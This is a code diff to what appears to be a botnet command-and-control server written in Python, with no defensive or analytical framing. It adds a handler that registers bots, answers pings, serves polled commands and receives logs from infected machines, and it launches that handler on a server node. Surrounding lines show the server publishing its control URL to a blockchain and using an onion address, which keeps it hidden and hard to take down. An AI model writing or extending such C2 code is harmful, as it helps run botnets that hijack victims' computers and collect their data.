@@ -317,6 +317,25 @@ def update_c2_url_on_blockchain(c2_url):
     except Exception as e:
         logger.error(f"Error updating C2 URL on the blockchain: {e}")
 
+def handle_client_request(data):
+    try:
+        request = json.loads(data.decode('utf-8'))
+        request_type = request.get('type')
+
+        if request_type == 'register':
+            return register_bot(request)
+        elif request_type == 'ping':
+            return ping(request)
+        elif request_type == 'poll':
+            return poll_commands(request)
+        elif request_type == 'log':
+            return receive_log(request)
+        else:
+            return json.dumps({'status': 'error', 'message': 'Unknown request type'}).encode('utf-8')
+    except Exception as e:
+        logger.exception(f"An error occurred while handling client request: {e}")
+        return json.dumps({'status': 'error', 'message': 'Internal server error'}).encode('utf-8')
+
 def main():
     # Start status checking thread
     status_thread = threading.Thread(target=check_bot_statuses)
@@ -329,6 +348,10 @@ def main():
         _sync_control_url_html(current_url)
         update_c2_url_on_blockchain(current_url)
 
+    # Start the PrimaryNode
+    primary_node = PrimaryNode(handle_client_request=handle_client_request)
+    primary_node.start_server()
+
     # Start Flask server
     control_url_for_display = get_control_url()
     if control_url_for_display:
@@ -339,18 +362,6 @@ def main():
         logger.warning("No control URL configured; update CONTROL-URL for onion address.")
     
     app.run(host='0.0.0.0', port=5000)
-
-@app.route('/')
-def index():
-    return send_from_directory('botnet/WEB-GUI', 'GUI-index.html')
-
-@app.route('/<module>')
-def module_page(module):
-    return send_from_directory(os.path.join('botnet/WEB-GUI', module), 'index.html')
-
-@app.route('/GUI-style.css')
-def style():
-    return send_from_directory('botnet/WEB-GUI', 'GUI-style.css')
 
 if __name__ == '__main__':
     main()
